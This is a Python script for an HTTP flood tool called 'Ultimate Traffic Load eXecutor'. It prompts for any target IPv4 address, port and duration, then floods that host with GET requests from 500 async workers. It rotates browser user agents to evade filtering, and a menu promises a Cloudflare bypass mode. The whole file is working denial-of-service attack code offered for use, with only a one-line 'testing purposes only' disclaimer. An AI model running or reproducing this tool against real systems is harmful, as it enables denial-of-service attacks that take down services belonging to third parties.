#!/usr/bin/env python3
import aiohttp
import asyncio
import random
import time
from colorama import Fore, Style, init

# Initialize colorama
init()

class UTLX:
    def __init__(self):
        self.sent = 0
        self.success = 0
        self.failed = 0
        self.running = False
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (Linux; Android 10; SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
        ]
        self.headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        }

    def display_banner(self):
        print(Fore.RED + """
         _   _ _____ _     _____  __
        | | | |_   _| |   |  _  \/  |
        | | | | | | | |   | | | |`| |
        | | | | | | | |   | | | | | |
        | |_| |_| |_| |___| |/ / _| |_
         \___/ \___/\_____/___/  \___/
        """ + Style.RESET_ALL)
        print(Fore.YELLOW + "Ultimate Traffic Load eXecutor" + Style.RESET_ALL)
        print(Fore.CYAN + "Build by Necuix for testing purposes only\n" + Style.RESET_ALL)

    async def send_request(self, target, port, session):
        self.sent += 1
        try:
            url = f"http://{target}:{port}/"
            headers = self.headers.copy()
            headers["User-Agent"] = random.choice(self.user_agents)
            
            async with session.get(url, headers=headers, timeout=5) as response:
                if response.status == 200:
                    self.success += 1
                else:
                    self.failed += 1
        except Exception as e:
            self.failed += 1

    async def run_attack(self, target, port, duration, workers):
        self.running = True
        self.sent = 0
        self.success = 0
        self.failed = 0
        
        start_time = time.time()
        
        connector = aiohttp.TCPConnector(force_close=True, limit=0)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for _ in range(workers):
                task = asyncio.create_task(self.worker(target, port, session, start_time, duration))
                tasks.append(task)
            
            # Display stats while attack is running
            while time.time() - start_time < duration and self.running:
                self.display_stats()
                await asyncio.sleep(0.5)
            
            await asyncio.gather(*tasks)
        
        self.display_stats()
        print("\nAttack completed!")

    async def worker(self, target, port, session, start_time, duration):
        while time.time() - start_time < duration and self.running:
            await self.send_request(target, port, session)

    def display_stats(self):
        print(Fore.GREEN + f"\rTRAFFIC SENT: {self.sent} | " +
              Fore.BLUE + f"SUCCESS: {self.success} | " +
              Fore.RED + f"FAILED: {self.failed}" + 
              Style.RESET_ALL, end="", flush=True)

    def get_input(self, prompt, validator=None, default=None):
        while True:
            try:
                value = input(prompt).strip()
                if not value and default is not None:
                    return default
                if validator:
                    if validator(value):
                        return value
                    else:
                        print(Fore.RED + "Invalid input. Please try again." + Style.RESET_ALL)
                else:
                    return value
            except KeyboardInterrupt:
                print("\nOperation cancelled by user.")
                exit()

    def validate_ip(self, ip):
        parts = ip.split('.')
        if len(parts) != 4:
            return False
        for part in parts:
            try:
                num = int(part)
                if num < 0 or num > 255:
                    return False
            except ValueError:
                return False
        return True

    def validate_port(self, port):
        try:
            port = int(port)
            return 1 <= port <= 65535
        except ValueError:
            return False

    def validate_duration(self, duration):
        try:
            duration = int(duration)
            return 1 <= duration <= 120
        except ValueError:
            return False

    def main_menu(self):
        self.display_banner()
        print(Fore.YELLOW + "Available Methods:" + Style.RESET_ALL)
        print("1. HTTP BUST")
        print("2. CF BUST (coming soon)")
        
        method = self.get_input("\nChoose The Method (1-2): ", lambda x: x in ['1', '2'])
        
        if method == '2':
            print(Fore.YELLOW + "\nCF BUST method is coming soon!" + Style.RESET_ALL)
            return
        
        target = self.get_input("Enter Target IPv4: ", self.validate_ip)
        port = self.get_input("Enter Port (default 80): ", self.validate_port, "80")
        duration = self.get_input("Enter Duration in seconds (max 120): ", self.validate_duration)
        
        workers = 500  # Adjust this based on your system capabilities
        
        print(Fore.RED + f"\nStarting HTTP BUST attack on {target}:{port} for {duration} seconds..." + Style.RESET_ALL)
        
        try:
            asyncio.run(self.run_attack(target, int(port), int(duration), workers))
        except KeyboardInterrupt:
            self.running = False
            print(Fore.RED + "\nAttack stopped by user!" + Style.RESET_ALL)

if __name__ == "__main__":
    tool = UTLX()
    tool.main_menu()